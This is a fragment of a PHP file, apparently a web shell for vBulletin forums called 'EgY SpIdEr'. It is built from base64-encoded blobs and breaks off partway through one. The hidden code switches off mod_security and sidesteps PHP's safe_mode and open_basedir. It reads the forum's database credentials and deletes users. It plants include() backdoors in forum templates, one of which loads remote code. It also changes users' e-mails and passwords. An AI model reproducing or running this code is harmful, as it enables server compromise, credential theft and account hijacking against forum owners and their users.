$htacces="PElmTW9kdWxlIG1vZF9zZWN1cml0eS5jPg0KICAgIFNlY0ZpbHRlckVuZ2luZSBPZmYNCiAgICBTZWNGaWx0ZXJTY2FuUE9TVCBPZmYNCjwvSWZNb2R1bGU+";
$egy_res="PD8NCmVjaG8gaW5pX2dldCgic2FmZV9tb2RlIik7DQplY2hvIGluaV9nZXQoIm9wZW5fYmFzZWRpciIpOw0KaW5jbHVkZSgkX0dFVFsiZmlsZSJdKTsNCmluaV9yZXN0b3JlKCJzYWZlX21vZGUiKTsNCmluaV9yZXN0b3JlKCJvcGVuX2Jhc2VkaXIiKTsNCmVjaG8gaW5pX2dldCgic2FmZV9tb2RlIik7DQplY2hvIGluaV9nZXQoIm9wZW5fYmFzZWRpciIpOw0KaW5jbHVkZSgkX0dFVFsiZWd5Il0pOw0KPz4=";
$egy_vb="DQo8aHRtbD48aGVhZD48dGl0bGU+RWdZIFNwSWRFciA8L3RpdGxlPg0KPFNUWUxFPg0KDQpCT0RZDQogew0KICAgICAgICBTQ1JPTExCQVItRkFDRS1DT0xPUjogIzAwMDAwMDsgU0NST0xMQkFSLUhJR0hMSUdIVC1DT0xPUjogIzAwMDAwMDsgU0NST0xMQkFSLVNIQURPVy1DT0xPUjogIzAwMDAwMDsgQ09MT1I6ICM2NjY2NjY7IFNDUk9MTEJBUi0zRExJR0hULUNPTE9SOiAjNzI2NDU2OyBTQ1JPTExCQVItQVJST1ctQ09MT1I6ICM3MjY0NTY7IFNDUk9MTEJBUi1UUkFDSy1DT0xPUjogIzI5MjkyOTsgRk9OVC1GQU1JTFk6IFZlcmRhbmE7IFNDUk9MTEJBUi1EQVJLU0hBRE9XLUNPTE9SOiAjNzI2NDU2DQp9DQoNCnRyIHsNCkJPUkRFUi1SSUdIVDogICNkYWRhZGEgOw0KQk9SREVSLVRPUDogICAgI2RhZGFkYSA7DQpCT1JERVItTEVGVDogICAjZGFkYWRhIDsNCkJPUkRFUi1CT1RUT006ICNkYWRhZGEgOw0KY29sb3I6ICNmZmZmZmY7DQp9DQp0ZCB7DQpCT1JERVItUklHSFQ6ICAjZGFkYWRhIDsNCkJPUkRFUi1UT1A6ICAgICNkYWRhZGEgOw0KQk9SREVSLUxFRlQ6ICAgI2RhZGFkYSA7DQpCT1JERVItQk9UVE9NOiAjZGFkYWRhIDsNCmNvbG9yOiAjZGFkYWRhOw0KfQ0KLnRhYmxlMSB7DQpCT1JERVI6IDE7DQpCQUNLR1JPVU5ELUNPTE9SOiAjMDAwMDAwOw0KY29sb3I6ICMzMzMzMzM7DQp9DQoudGQxIHsNCkJPUkRFUjogMTsNCmZvbnQ6IDdwdCB0YWhvbWE7DQpjb2xvcjogI2ZmZmZmZjsNCn0NCi50cjEgew0KQk9SREVSOiAxOw0KY29sb3I6ICNkYWRhZGE7DQp9DQp0YWJsZSB7DQpCT1JERVI6ICAjZWVlZWVlICBvdXRzZXQ7DQpCQUNLR1JPVU5ELUNPTE9SOiAjMDAwMDAwOw0KY29sb3I6ICNkYWRhZGE7DQp9DQppbnB1dCB7DQpCT1JERVItUklHSFQ6ICAjMDBGRjAwIDEgc29saWQ7DQpCT1JERVItVE9QOiAgICAjMDBGRjAwIDEgc29saWQ7DQpCT1JERVItTEVGVDogICMwMEZGMDAgMSBzb2xpZDsNCkJPUkRFUi1CT1RUT006ICMwMEZGMDAgMSBzb2xpZDsNCkJBQ0tHUk9VTkQtQ09MT1I6ICMzMzMzMzM7DQpmb250OiA5cHQgdGFob21hOw0KY29sb3I6ICNmZmZmZmY7DQp9DQpzZWxlY3Qgew0KQk9SREVSLVJJR0hUOiAgI2ZmZmZmZiAxIHNvbGlkOw0KQk9SREVSLVRPUDogICAgIzk5OTk5OSAxIHNvbGlkOw0KQk9SREVSLUxFRlQ6ICAgIzk5OTk5OSAxIHNvbGlkOw0KQk9SREVSLUJPVFRPTTogI2ZmZmZmZiAxIHNvbGlkOw0KQkFDS0dST1VORC1DT0xPUjogIzAwMDAwMDsNCmZvbnQ6IDlwdCB0YWhvbWE7DQpjb2xvcjogI2RhZGFkYTs7DQp9DQpzdWJtaXQgew0KQk9SREVSOiAgYnV0dG9uaGlnaGxpZ2h0IDEgb3V0c2V0Ow0KQkFDS0dST1VORC1DT0xPUjogIzI3MjcyNzsNCndpZHRoOiA0MCU7DQpjb2xvcjogI2RhZGFkYTsNCn0NCnRleHRhcmVhIHsNCkJPUkRFUi1SSUdIVDogICNmZmZmZmYgMSBzb2xpZDsNCkJPUkRFUi1UT1A6ICAgICM5OTk5OTkgMSBzb2xpZDsNCkJPUkRFUi1MRUZUOiAgICM5OTk5OTkgMSBzb2xpZDsNCkJPUkRFUi1CT1RUT006ICNmZmZmZmYgMSBzb2xpZDsNCkJBQ0tHUk9VTkQtQ09MT1I6ICMzMzMzMzM7DQpmb250OiBGaXhlZHN5cyBib2xkOw0KY29sb3I6ICNmZmZmZmY7DQp9DQpCT0RZIHsNCm1hcmdpbjogMTsNCmNvbG9yOiAjZGFkYWRhOw0KYmFja2dyb3VuZC1jb2xvcjogIzAwMDAwMDsNCn0NCkE6bGluayB7Q09MT1I6cmVkOyBURVhULURFQ09SQVRJT046IG5vbmV9DQpBOnZpc2l0ZWQgeyBDT0xPUjpyZWQ7IFRFWFQtREVDT1JBVElPTjogbm9uZX0NCkE6YWN0aXZlIHtDT0xPUjpyZWQ7IFRFWFQtREVDT1JBVElPTjogbm9uZX0NCkE6aG92ZXIge2NvbG9yOmJsdWU7VEVYVC1ERUNPUkFUSU9OOiBub25lfQ0KDQo8L1NUWUxFPg0KPC9oZWFkPg0KIDxib2R5IGJnY29sb3I9IiMwMDAwMDAiIHRleHQ9ImxpbWUiIGxpbms9ImxpbWUiIHZsaW5rPSJsaW1lIj4NCiA8Y2VudGVyPg0KPD8NCiRhY3QgPSAkX0dFVFsnYWN0J107DQppZigkYWN0PT0ncmVjb25maWcnICYmIGlzc2V0KCRfUE9TVFsncGF0aCddKSkNCnsNCiRwYXRoID0gJF9QT1NUWydwYXRoJ107DQppbmNsdWRlICRwYXRoOw0KPz4NCjx0YWJsZSBib3JkZXI9IjEiIGJnY29sb3I9IiMwMDAwMDAiIGJvcmRlcmNvbG9yPSJsaW1lIg0KYm9yZGVyY29sb3JkYXJrPSJsaW1lIiBib3JkZXJjb2xvcmxpZ2h0PSJsaW1lIj48dGg+Ojo6OlJlYWQgQ29uZmlnIERhdGE6Ojo6PC90aD48dGg+PD8gZWNobyAnPGZvbnQgY29sb3I9eWVsbG93PicgLiAkcGF0aCAuICc8L2ZvbnQ+JzsgPz48L3RoPg0KPHRyPg0KPHRoPkhvc3QgOiA8L3RoPjx0aD48PyBlY2hvICc8Zm9udCBjb2xvcj15ZWxsb3c+JyAuICRjb25maWdbJ01hc3RlclNlcnZlciddWydzZXJ2ZXJuYW1lJ10gLiAnPC9mb250Pic7ID8+PC90aD4NCjwvdHI+DQo8dHI+DQo8dGg+VXNlciA6IDwvdGg+PHRoPjw/IGVjaG8gJzxmb250IGNvbG9yPXllbGxvdz4nIC4gJGNvbmZpZ1snTWFzdGVyU2VydmVyJ11bJ3VzZXJuYW1lJ10gLiAnPC9mb250Pic7ID8+PC90aD4NCjwvdHI+DQo8dHI+DQo8dGg+UGFzcyA6IDwvdGg+PHRoPjw/DQokcGFzc3NxbCA9ICRjb25maWdbJ01hc3RlclNlcnZlciddWydwYXNzd29yZCddOw0KaWYgKCRwYXNzc3FsID09ICcnKQ0Kew0KJHJlc3VsdCA9ICc8Zm9udCBjb2xvcj1yZWQ+Tm8gUGFzc3dvcmQ8L2ZvbnQ+JzsNCn0gZWxzZSB7DQokcmVzdWx0ID0gJzxmb250IGNvbG9yPXllbGxvdz4nIC4gJHBhc3NzcWwgLiAnPC9mb250Pic7DQp9DQplY2hvICRyZXN1bHQ7ID8+PC90aD4NCjwvdHI+DQo8dHI+DQo8dGg+TmFtZSA6IDwvdGg+PHRoPjw/IGVjaG8gJzxmb250IGNvbG9yPXllbGxvdz4nIC4gJGNvbmZpZ1snRGF0YWJhc2UnXVsnZGJuYW1lJ10gLiAnPC9mb250Pic7ID8+PC90aD4NCjwvdHI+DQo8L3RhYmxlPg0KPD8NCn0NCmlmKGlzc2V0KCRfUE9TVFsnaG9zdCddKSAmJiBpc3NldCgkX1BPU1RbJ3VzZXInXSkgJiYgaXNzZXQoJF9QT1NUWydwYXNzJ10pICYmIGlzc2V0KCRfUE9TVFsnZGInXSkgJiYgJGFjdD09ImRlbCIgICYmIGlzc2V0KCRfUE9TVFsndmJ1c2VyJ10pICkNCnsNCiAkaG9zdCA9ICRfUE9TVFsnaG9zdCddOw0KJHVzZXIgPSAkX1BPU1RbJ3VzZXInXTsNCiRwYXNzID0gJF9QT1NUWydwYXNzJ107DQokZGIgPSAkX1BPU1RbJ2RiJ107DQokdmJ1c2VyID0gJF9QT1NUWyd2YnVzZXInXTsNCm15c3FsX2Nvbm5lY3QoJGhvc3QsJHVzZXIsJHBhc3MpIG9yIGRpZSgnPGZvbnQgY29sb3I9cmVkPk5vcGUsPC9mb250Pjxmb250IGNvbG9yPXllbGxvdz5ObyBjT25uZWN0aW9uIHdpdGggdXNlcjwvZm9udD4nKTsNCm15c3FsX3NlbGVjdF9kYigkZGIpIG9yIGRpZSgnPGZvbnQgY29sb3I9cmVkPk5vcGUsPC9mb250Pjxmb250IGNvbG9yPXllbGxvdz5ObyBjT25uZWN0aW9uIHdpdGggREI8L2ZvbnQ+Jyk7DQppZiAoJHBhc3MgPT0gJycpDQp7DQokbnBhc3MgPSAnTlVMTCc7DQp9IGVsc2Ugew0KJG5wYXNzID0gJHBhc3M7DQp9DQplY2hvJzxmb250IHNpemU9Mz5Zb3UgYXJlIGNvbm5lY3RlZCB3aXRoIHRoZSBteXNxbCBzZXJ2ZXIgb2YgPGZvbnQgY29sb3I9eWVsbG93PicgLiAkaG9zdCAuICc8L2ZvbnQ+IGJ5IHVzZXIgOiA8Zm9udCBjb2xvcj15ZWxsb3c+JyAuICR1c2VyIC4gJzwvZm9udD4gLCBwYXNzIDogPGZvbnQgY29sb3I9eWVsbG93PicgLiAkbnBhc3MgLiAnPC9mb250PiBhbmQgc2VsZWN0ZWQgREIgd2l0aCB0aGUgbmFtZSA8Zm9udCBjb2xvcj15ZWxsb3c+JyAuICRkYiAuICc8L2ZvbnQ+PC9mb250Pic7DQo/Pg0KPGhyIGNvbG9yPSIjMDBGRjAwIiAvPg0KPD8NCiRxdWVyeSA9ICdkZWxldGUgKiBmcm9tIHVzZXIgd2hlcmUgdXNlcm5hbWU9IicgLiAkdmJ1c2VyIC4gJyI7JzsNCiRyID0gbXlzcWxfcXVlcnkoJHF1ZXJ5KTsNCmlmICgkcikNCnsNCmVjaG8gJzxmb250IGNvbG9yPXllbGxvdz5Vc2VyIDogJyAuICR2YnVzZXIgLiAnIHdhcyBkZWxldGVkPC9mb250Pic7DQp9IGVsc2Ugew0KZWNobyAnPGZvbnQgY29sb3I9cmVkPlVzZXIgOiAnIC4gJHZidXNlciAuICcgY291bGQgbm90IGJlIGRlbGV0ZWQ8L2ZvbnQ+JzsNCn0NCn0NCmlmKGlzc2V0KCRfUE9TVFsnaG9zdCddKSAmJiBpc3NldCgkX1BPU1RbJ3VzZXInXSkgJiYgaXNzZXQoJF9QT1NUWydwYXNzJ10pICYmIGlzc2V0KCRfUE9TVFsnZGInXSkgJiYgJGFjdD09InNoZWxsIiAgJiYgaXNzZXQoJF9QT1NUWyd2YXInXSkpDQp7DQokaG9zdCA9ICRfUE9TVFsnaG9zdCddOw0KJHVzZXIgPSAkX1BPU1RbJ3VzZXInXTsNCiRwYXNzID0gJF9QT1NUWydwYXNzJ107DQokZGIgPSAkX1BPU1RbJ2RiJ107DQokdmFyID0gJF9QT1NUWyd2YXInXTsNCm15c3FsX2Nvbm5lY3QoJGhvc3QsJHVzZXIsJHBhc3MpIG9yIGRpZSgnPGZvbnQgY29sb3I9cmVkPk5vcGUsPC9mb250Pjxmb250IGNvbG9yPXllbGxvdz5ObyBjT25uZWN0aW9uIHdpdGggdXNlcjwvZm9udD4nKTsNCm15c3FsX3NlbGVjdF9kYigkZGIpIG9yIGRpZSgnPGZvbnQgY29sb3I9cmVkPk5vcGUsPC9mb250Pjxmb250IGNvbG9yPXllbGxvdz5ObyBjT25uZWN0aW9uIHdpdGggREI8L2ZvbnQ+Jyk7DQppZiAoJHBhc3MgPT0gJycpDQp7DQokbnBhc3MgPSAnTlVMTCc7DQp9IGVsc2Ugew0KJG5wYXNzID0gJHBhc3M7DQp9DQplY2hvJzxmb250IHNpemU9Mz5Zb3UgYXJlIGNvbm5lY3RlZCB3aXRoIHRoZSBteXNxbCBzZXJ2ZXIgb2YgPGZvbnQgY29sb3I9eWVsbG93PicgLiAkaG9zdCAuICc8L2ZvbnQ+IGJ5IHVzZXIgOiA8Zm9udCBjb2xvcj15ZWxsb3c+JyAuICR1c2VyIC4gJzwvZm9udD4gLCBwYXNzIDogPGZvbnQgY29sb3I9eWVsbG93PicgLiAkbnBhc3MgLiAnPC9mb250PiBhbmQgc2VsZWN0ZWQgREIgd2l0aCB0aGUgbmFtZSA8Zm9udCBjb2xvcj15ZWxsb3c+JyAuICRkYiAuICc8L2ZvbnQ+PC9mb250Pic7DQo/Pg0KPGhyIGNvbG9yPSIjMDBGRjAwIiAvPg0KPD8NCiRXZHQgPSAnVVBEQVRFIGB0ZW1wbGF0ZWAgU0VUIGB0ZW1wbGF0ZWAgPSBcJyAiLnByaW50IGluY2x1ZGUoJEhUVFBfR0VUX1ZBUlNbJyAuICR2YXIgLiAnXSkuIiBcJ1dIRVJFIGB0aXRsZWAgPVwnRk9SVU1IT01FXCc7JzsNCiRXZHQyPSAnVVBEQVRFIGBzdHlsZWAgU0VUIGBjc3NgID0gXCcgIi5wcmludCBpbmNsdWRlKCRIVFRQX0dFVF9WQVJTWycgLiAkdmFyIC4gJ10pLiIgXCcsIGBzdHlsZXZhcnNgID0gXCdcJywgYGNzc2NvbG9yc2AgPSBcJ1wnLCBgZWRpdG9yc3R5bGVzYCA9IFwnXCcgOyc7DQokcmVzdWx0PW15c3FsX3F1ZXJ5KCRXZHQpOw0KICBpZiAoJHJlc3VsdCkge2VjaG8gIjxwPkRvbmUgRXhwbG9pdC48L3A+PGJyPlVzZSB0aGlzIDogPGJyPiBpbmRleC5waHA/IiAuICR2YXIgLiAiPXNoZWxsLnR4dCI7fWVsc2V7DQplY2hvICI8cD5FcnJvcjwvcD4iO30NCiRyZXN1bHQxPW15c3FsX3F1ZXJ5KCRXZHQyKTsNCiAgaWYgKCRyZXN1bHQxKSB7IGVjaG8gIjxwPkRvbmUgQ3JlYXRlIEZpbGU8L3A+PGJyPlVzZSB0aGlzIDogPGJyPiBpbmRleC5waHA/IiAuICR2YXIgLiAiPXNoZWxsLnR4dCI7fSBlbHNleyBlY2hvICI8cD5FcnJvcjwvcD4iO30NCn0NCmlmKGlzc2V0KCRfUE9TVFsnaG9zdCddKSAmJiBpc3NldCgkX1BPU1RbJ3VzZXInXSkgJiYgaXNzZXQoJF9QT1NUWydwYXNzJ10pICYmIGlzc2V0KCRfUE9TVFsnZGInXSkgJiYgJGFjdD09ImNvZGUiICAmJiBpc3NldCgkX1BPU1RbJ2NvZGUnXSkpDQp7DQokaG9zdCA9ICRfUE9TVFsnaG9zdCddOw0KJHVzZXIgPSAkX1BPU1RbJ3VzZXInXTsNCiRwYXNzID0gJF9QT1NUWydwYXNzJ107DQokZGIgPSAkX1BPU1RbJ2RiJ107DQokaW5kZXggPSAkX1BPU1RbJ2NvZGUnXTsNCm15c3FsX2Nvbm5lY3QoJGhvc3QsJHVzZXIsJHBhc3MpIG9yIGRpZSgnPGZvbnQgY29sb3I9cmVkPk5vcGUsPC9mb250Pjxmb250IGNvbG9yPXllbGxvdz5ObyBjT25uZWN0aW9uIHdpdGggdXNlcjwvZm9udD4nKTsNCm15c3FsX3NlbGVjdF9kYigkZGIpIG9yIGRpZSgnPGZvbnQgY29sb3I9cmVkPk5vcGUsPC9mb250Pjxmb250IGNvbG9yPXllbGxvdz5ObyBjT25uZWN0aW9uIHdpdGggREI8L2ZvbnQ+Jyk7DQppZiAoJHBhc3MgPT0gJycpDQp7DQokbnBhc3MgPSAnTlVMTCc7DQp9IGVsc2Ugew0KJG5wYXNzID0gJHBhc3M7DQp9DQplY2hvJzxmb250IHNpemU9Mz5Zb3UgYXJlIGNvbm5lY3RlZCB3aXRoIHRoZSBteXNxbCBzZXJ2ZXIgb2YgPGZvbnQgY29sb3I9eWVsbG93PicgLiAkaG9zdCAuICc8L2ZvbnQ+IGJ5IHVzZXIgOiA8Zm9udCBjb2xvcj15ZWxsb3c+JyAuICR1c2VyIC4gJzwvZm9udD4gLCBwYXNzIDogPGZvbnQgY29sb3I9eWVsbG93PicgLiAkbnBhc3MgLiAnPC9mb250PiBhbmQgc2VsZWN0ZWQgREIgd2l0aCB0aGUgbmFtZSA8Zm9udCBjb2xvcj15ZWxsb3c+JyAuICRkYiAuICc8L2ZvbnQ+PC9mb250Pic7DQo/Pg0KPGhyIGNvbG9yPSIjMDBGRjAwIiAvPg0KPD8NCiRpbmRleCA9ICRfUE9TVFsnYiddOw0KJFdkdCA9ICdVUERBVEUgYHRlbXBsYXRlYCBTRVQgYHRlbXBsYXRlYCA9IFwnICcgLiAkaW5kZXggLiAnICBcJ1dIRVJFIGB0aXRsZWAgPVwnRk9SVU1IT01FXCc7JzsNCiRXZHQyPSAnVVBEQVRFIGBzdHlsZWAgU0VUIGBjc3NgID0gXCcgJyAuICRpbmRleCAuICcgXCcsIGBzdHlsZXZhcnNgID0gXCdcJywgYGNzc2NvbG9yc2AgPSBcJ1wnLCBgZWRpdG9yc3R5bGVzYCA9IFwnXCcgOyc7DQokcmVzdWx0PW15c3FsX3F1ZXJ5KCRXZHQpOw0KICBpZiAoJHJlc3VsdCkge2VjaG8gIjxwPkluZGV4IHdhcyBDaGFuZ2VkIFN1Y2NlZnVsbHk8L3A+Ijt9ZWxzZXsNCmVjaG8gIjxwPkZhaWxlZCB0byBjaGFuZ2UgaW5kZXg8L3A+Ijt9DQokcmVzdWx0MT1teXNxbF9xdWVyeSgkV2R0Mik7DQppZiAoJHJlc3VsdDEpIHtlY2hvICI8cD5Eb25lIENyZWF0ZSBGaWxlPC9wPiI7fSBlbHNleyBlY2hvICI8cD5FcnJvcjwvcD4iO30NCn0NCg0KaWYoaXNzZXQoJF9QT1NUWydob3N0J10pICYmIGlzc2V0KCRfUE9TVFsndXNlciddKSAmJiBpc3NldCgkX1BPU1RbJ3Bhc3MnXSkgJiYgaXNzZXQoJF9QT1NUWydkYiddKSAmJiAkYWN0PT0iaW5jIiAgJiYgaXNzZXQoJF9QT1NUWydsaW5rJ10pKQ0Kew0KJGhvc3QgPSAkX1BPU1RbJ2hvc3QnXTsNCiR1c2VyID0gJF9QT1NUWyd1c2VyJ107DQokcGFzcyA9ICRfUE9TVFsncGFzcyddOw0KJGRiID0gJF9QT1NUWydkYiddOw0KJHZibGluayA9ICRfUE9TVFsnbGluayddOw0KbXlzcWxfY29ubmVjdCgkaG9zdCwkdXNlciwkcGFzcykgb3IgZGllKCc8Zm9udCBjb2xvcj1yZWQ+Tm9wZSw8L2ZvbnQ+PGZvbnQgY29sb3I9eWVsbG93Pk5vIGNPbm5lY3Rpb24gd2l0aCB1c2VyPC9mb250PicpOw0KbXlzcWxfc2VsZWN0X2RiKCRkYikgb3IgZGllKCc8Zm9udCBjb2xvcj1yZWQ+Tm9wZSw8L2ZvbnQ+PGZvbnQgY29sb3I9eWVsbG93Pk5vIGNPbm5lY3Rpb24gd2l0aCBEQjwvZm9udD4nKTsNCmlmICgkcGFzcyA9PSAnJykNCnsNCiRucGFzcyA9ICdOVUxMJzsNCn0gZWxzZSB7DQokbnBhc3MgPSAkcGFzczsNCn0NCmVjaG8nPGZvbnQgc2l6ZT0zPllvdSBhcmUgY29ubmVjdGVkIHdpdGggdGhlIG15c3FsIHNlcnZlciBvZiA8Zm9udCBjb2xvcj15ZWxsb3c+JyAuICRob3N0IC4gJzwvZm9udD4gYnkgdXNlciA6IDxmb250IGNvbG9yPXllbGxvdz4nIC4gJHVzZXIgLiAnPC9mb250PiAsIHBhc3MgOiA8Zm9udCBjb2xvcj15ZWxsb3c+JyAuICRucGFzcyAuICc8L2ZvbnQ+IGFuZCBzZWxlY3RlZCBEQiB3aXRoIHRoZSBuYW1lIDxmb250IGNvbG9yPXllbGxvdz4nIC4gJGRiIC4gJzwvZm9udD48L2ZvbnQ+JzsNCj8+DQo8aHIgY29sb3I9IiMwMEZGMDAiIC8+DQo8Pw0KJGhhY2sxNSA9ICdVUERBVEUgYHRlbXBsYXRlYCBTRVQgYHRlbXBsYXRlYCA9IFwnJHNwYWNlcl9vcGVuDQp7JHtpbmNsdWRlKFwnXCcnIC4gJHZibGluayAuICdcJ1wnKX19eyR7ZXhpdCgpfX0mDQokX3BocGluY2x1ZGVfb3V0cHV0XCdXSEVSRSBgdGl0bGVgID1cJ0ZPUlVNSE9NRVwnOyc7DQokaGFjaz0gJ1VQREFURSBgc3R5bGVgIFNFVCBgY3NzYCA9IFwnJHNwYWNlcl9vcGVuDQp7JHtpbmNsdWRlKFwnXCcnIC4gJHZibGluayAuJ1wnXCcpfX17JHtleGl0KCl9fSYNCiRfcGhwaW5jbHVkZV9vdXRwdXRcJywgYHN0eWxldmFyc2AgPSBcJ1wnLCBgY3NzY29sb3JzYCA9IFwnXCcsIGBlZGl0b3JzdHlsZXNgID0gXCdcJyA7JzsNCiRyZXN1bHQ9bXlzcWxfcXVlcnkoJGhhY2sxNSkgb3IgZGllKG15c3FsX2Vycm9yKCkpOw0KJHJlc3VsdD1teXNxbF9xdWVyeSgkaGFjaykgb3IgZGllKG15c3FsX2Vycm9yKCkpOw0KfQ0KaWYoaXNzZXQoJF9QT1NUWydob3N0J10pICYmIGlzc2V0KCRfUE9TVFsndXNlciddKSAmJiBpc3NldCgkX1BPU1RbJ3Bhc3MnXSkgJiYgaXNzZXQoJF9QT1NUWydkYiddKSAmJiAkYWN0PT0ibWFpbCIgICYmIGlzc2V0KCRfUE9TVFsndmJ1c2VyJ10pICAmJiBpc3NldCgkX1BPU1RbJ3ZibWFpbCddKSkNCnsNCiAkaG9zdCA9ICRfUE9TVFsnaG9zdCddOw0KJHVzZXIgPSAkX1BPU1RbJ3VzZXInXTsNCiRwYXNzID0gJF9QT1NUWydwYXNzJ107DQokZGIgPSAkX1BPU1RbJ2RiJ107DQokdmJ1c2VyID0gJF9QT1NUWyd2YnVzZXInXTsNCiR2Ym1haWwgPSAkX1BPU1RbJ3ZibWFpbCddOw0KbXlzcWxfY29ubmVjdCgkaG9zdCwkdXNlciwkcGFzcykgb3IgZGllKCc8Zm9udCBjb2xvcj1yZWQ+Tm9wZSw8L2ZvbnQ+PGZvbnQgY29sb3I9eWVsbG93Pk5vIGNPbm5lY3Rpb24gd2l0aCB1c2VyPC9mb250PicpOw0KbXlzcWxfc2VsZWN0X2RiKCRkYikgb3IgZGllKCc8Zm9udCBjb2xvcj1yZWQ+Tm9wZSw8L2ZvbnQ+PGZvbnQgY29sb3I9eWVsbG93Pk5vIGNPbm5lY3Rpb24gd2l0aCBEQjwvZm9udD4nKTsNCmlmICgkcGFzcyA9PSAnJykNCnsNCiRucGFzcyA9ICdOVUxMJzsNCn0gZWxzZSB7DQokbnBhc3MgPSAkcGFzczsNCn0NCmVjaG8nPGZvbnQgc2l6ZT0zPllvdSBhcmUgY29ubmVjdGVkIHdpdGggdGhlIG15c3FsIHNlcnZlciBvZiA8Zm9udCBjb2xvcj15ZWxsb3c+JyAuICRob3N0IC4gJzwvZm9udD4gYnkgdXNlciA6IDxmb250IGNvbG9yPXllbGxvdz4nIC4gJHVzZXIgLiAnPC9mb250PiAsIHBhc3MgOiA8Zm9udCBjb2xvcj15ZWxsb3c+JyAuICRucGFzcyAuICc8L2ZvbnQ+IGFuZCBzZWxlY3RlZCBEQiB3aXRoIHRoZSBuYW1lIDxmb250IGNvbG9yPXllbGxvdz4nIC4gJGRiIC4gJzwvZm9udD48L2ZvbnQ+JzsNCj8+DQo8aHIgY29sb3I9IiMwMEZGMDAiIC8+DQo8Pw0KJHF1ZXJ5ID0gJ3VwZGF0ZSB1c2VyIHNldCBlbWFpbD0iJyAuICR2Ym1haWwgLiAnIiB3aGVyZSB1c2VybmFtZT0iJyAuICR2YnVzZXIgLiAnIjsnOw0KJHJlID0gbXlzcWxfcXVlcnkoJHF1ZXJ5KTsNCmlmICgkcmUpDQp7DQplY2hvICc8Zm9udCBzaXplPTM+PGZvbnQgY29sb3I9eWVsbG93PlRoZSBFLU1BSUwgb2YgdGhlIHVzZXIgPC9mb250Pjxmb250IGNvbG9yPXJlZD4nIC4gJHZidXNlciAuICc8L2ZvbnQ+PGZvbnQgY29sb3I9eWVsbG93PiB3YXMgY2hhbmdlZCB0byA8L2ZvbnQ+PGZvbnQgY29sb3I9cmVkPicgLiAkdmJtYWlsIC4gJzwvZm9udD48YnI+QmFjayB0byA8YSBocmVmPSI/Ij5TaGVsbDwvYT48L2ZvbnQ+JzsNCn0gZWxzZSB7DQplY2hvICc8Zm9udCBzaXplPTM+PGZvbnQgY29sb3I9cmVkPkZhaWxlZCB0byBjaGFuZ2UgRS1NQUlMPC9mb250PjwvZm9udD4nOw0KfQ0KfQ0KaWYoaXNzZXQoJF9QT1NUWydob3N0J10pICYmIGlzc2V0KCRfUE9TVFsndXNlciddKSAmJiBpc3NldCgkX1BPU1RbJ3Bhc3MnXSkgJiYgaXNzZXQoJF9QT1NUWydkYiddKSAmJiAkYWN0PT0icHN3IiAgJiYgaXNzZXQoJF9QT1NUWyd2YnVzZXInXSkgICYmIGlzc2V0KCRfUE9TVFsndmJwYXNzJ10pKQ0Kew0KJGhvc3QgPSAkX1BPU1RbJ2hvc3QnXTsNCiR1c2VyID0gJF9QT1NUWyd1c2VyJ107DQokcGFzcyA9ICRfUE9TVFsncGFzcyddOw0KJGRiID0gJF9QT1NUWydkYiddOw0KJHZidXNlciA9ICRfUE9TVFsndmJ1c2VyJ107DQokdmJwYXNzID0gJF9QT1NUWyd2YnBhc3MnXTsNCm15c3FsX2Nvbm5lY3QoJGhvc3QsJHVzZXIsJHBhc3MpIG9yIGRpZSgnPGZvbnQgY29sb3I9cmVkPk5vcGUsPC9mb250Pjxmb250IGNvbG9yPXllbGxvdz5ObyBjT25uZWN0aW9uIHdpdGggdXNlcjwvZm9udD4nKTsNCm15c3FsX3NlbGVjdF9kYigkZGIpIG9yIGRpZSgnPGZvbnQgY29sb3I9cmVkPk5vcGUsPC9mb250Pjxmb250IGNvbG9yPXllbGxvdz5ObyBjT25uZWN0aW9uIHdpdGggREI8L2ZvbnQ+Jyk7DQppZiAoJHBhc3MgPT0gJycpDQp7DQokbnBhc3MgPSAnTlVMTCc7DQp9IGVsc2Ugew0KJG5wYXNzID0gJHBhc3M7DQp9DQplY2hvJzxmb250IHNpemU9Mz5Zb3UgYXJlIGNvbm5lY3RlZCB3aXRoIHRoZSBteXNxbCBzZXJ2ZXIgb2YgPGZvbnQgY29sb3I9eWVsbG93PicgLiAkaG9zdCAuICc8L2ZvbnQ+IGJ5IHVzZXIgOiA8Zm9udCBjb2xvcj15ZWxsb3c+JyAuICR1c2VyIC4gJzwvZm9udD4gLCBwYXNzIDogPGZvbnQgY29sb3I9eWVsbG93PicgLiAkbnBhc3MgLiAnPC9mb250PiBhbmQgc2VsZWN0ZWQgREIgd2l0aCB0aGUgbmFtZSA8Zm9udCBjb2xvcj15ZWxsb3c+JyAuICRkYiAuICc8L2ZvbnQ+PC9mb250Pic7DQo/Pg0KPGhyIGNvbG9yPSIjMDBGRjAwIiAvPg0KPD8NCiRxdWVyeSA9ICdzZWxlY3QgKiBmcm9tIHVzZXIgd2hlcmUgdXNlcm5hbWU9IicgLiAkdmJ1c2VyIC4gJyI7JzsNCiRyZXN1bHQgPSBteXNxbF9xdWVyeSgkcXVlcnkpOw0Kd2hpbGUgKCRyb3cgPSBteXNxbF9mZXRjaF9hcnJheSgkcmVzdWx0KSkNCnsNCiRzYWx0ID0gJHJvd1snc2FsdCddOw0KJHggPSBtZDUoJHZicGFzcyk7DQokeCA9JHggLiAkc2FsdDsNCiRwYXNzX3NhbHQgPSBtZDUoJHgpOw0KJHF1ZXJ5ID0gJ3VwZGF0ZSB1c2VyIHNldCBwYXNzd29yZD0iJyAuICRwYXNzX3NhbHQgLiAnIiB3aGVyZSB1c2VybmFtZT0iJyAuICR2YnVzZXIgLiAnIjsnOw0KJHJlID0gbXlzcWxfcXVlcnkoJHF1ZXJ5KTsNCmlmICgkcmUpDQp7DQplY2hvICc8Zm9udCBzaXplPTM+PGZvbnQgY29sb3I9eWVsbG93PlRoZSBwYXNzIG9mIHRoZSB1c2VyIDwvZm9udD48Zm9udCBjb2xvcj1yZWQ+JyAuICR2YnVzZXIgLiAnPC9mb250Pjxmb250IGNvbG9yPXllbGxvdz4gd2FzIGNoYW5nZWQgdG8gPC9mb250Pjxmb250IGNvbG9yPXJlZD4nIC4gJHZicGFzcyAuICc8L2ZvbnQ+PGJyPkJhY2sgdG8gPGEgaHJlZj0iPyI+U2hlbGw8L2E+PC9mb250Pic7DQp9IGVsc2Ugew0KZWNobyAnPGZvbnQgc2l6ZT0zPjxmb250IGNvbG9yPXJlZD5GYWlsZWQgdG8gY2hhbmdlIFBhc3NXb3JkPC9mb250PjwvZm9udD4nOw0KfQ0KfQ0KfQ0KaWYoaXNzZXQoJF9QT1NUWydob3N0J10pICYmIGlzc2V0KCRfUE9TVFsndXNlciddKSAmJiBpc3NldCgkX1BPU1RbJ3Bhc3MnXSkgJiYgaX